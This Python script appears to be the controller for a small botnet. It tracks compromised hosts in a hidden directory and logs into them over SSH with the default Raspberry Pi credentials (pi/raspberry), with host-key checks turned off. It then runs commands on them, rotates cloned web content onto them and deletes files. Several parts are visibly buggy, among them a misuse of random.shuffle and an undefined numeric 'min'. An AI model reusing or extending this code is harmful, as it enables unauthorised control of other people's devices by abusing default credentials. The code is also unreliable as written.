#!/usr/bin/python3

import glob
import hashlib
import os
import queue
import random
import re
import time

import paramiko
import requests

from BotsState import BotsState
from UploadServer import UploadServer

q = queue.Queue()
bots = []
websiteBots = []
freeBots = []

config = {
    "bot_file": "/var/www/.uh/bots.txt",
    "backup": "/var/www/.uh/backup.txt",

    "http_port": 58428,
    "threads": 10,

    "ssh_port": 22,
    "ssh_user": "pi",
    "ssh_pass": "raspberry"
}


# Auxiliary functions

def get_hash(text):
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def rest(dur):
    time.sleep(random.uniform(0.8, 1.2) * 3600 * dur)


# 0
# Update bots

def update_bots():
    global bots, websiteBots, freeBots
    bots = BotsState(config["bot_file"], config["ssh_port"], config["threads"]).status()
    websiteBots = BotsState(config["bot_file"], config["http_port"], config["threads"]).status()
    freeBots = [bot for bot in bots if bot not in websiteBots]


# 1.1

def check_state(servers):
    bot_hashes = [bot_hash(bot) for bot in websiteBots]

    for server in servers:
        if server_hash(server) not in bot_hashes:
            upload_server(server)
            break

    rest(1)
    main()


def bot_hash(bot):
    try:
        bot_site = requests.get("http://%s:%d/index.html" % (bot, config["http_port"])).text
        return get_hash(bot_site)
    except:
        return None


def server_hash(server):
    server_link = re.search(r"https://github.com/(.*)/\.git$", server)
    server_site = requests.get("https://raw.githubusercontent.com/%s/master/index.html" % server_link).text
    return get_hash(server_site)


# 2
# Activate server

def upload_server(server):
    os.system("git clone %s /var/www/html" % server)
    os.remove(config["backup"])
    UploadServer(server, bots)
    rest(12)
    remove_server()


def send_backup(server):
    # Choose random bots
    bs = random.shuffle(freeBots)
    minr = int(len(bs) / 3)
    maxr = int(len(bs) * 2 / 3)
    bc = bs[:random.randint(minr, maxr)]
    # Install server in bots
    installed = [install_backup(server, bot) for bot in bc]
    if sum(installed) < min / 2:
        send_backup(server)


def install_backup(server, bot):
    ssh = initialize_paramiko()
    try:
        ssh.connect(bot, port=config["ssh_port"], username=config["ssh_user"], password=config["ssh_pass"], timeout=5)
        ssh.exec_command("echo '%s' >> %s" % (server, config["backup"]))
        ssh.close()
        return True
    except:
        return False


def initialize_paramiko():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def remove_server():
    [os.remove(f) for f in glob.glob("/var/www/html/*")]


def main():
    update_bots()
    check_state(BotsState.get_file(config["backup"]))


if __name__ == "__main__":
    main()
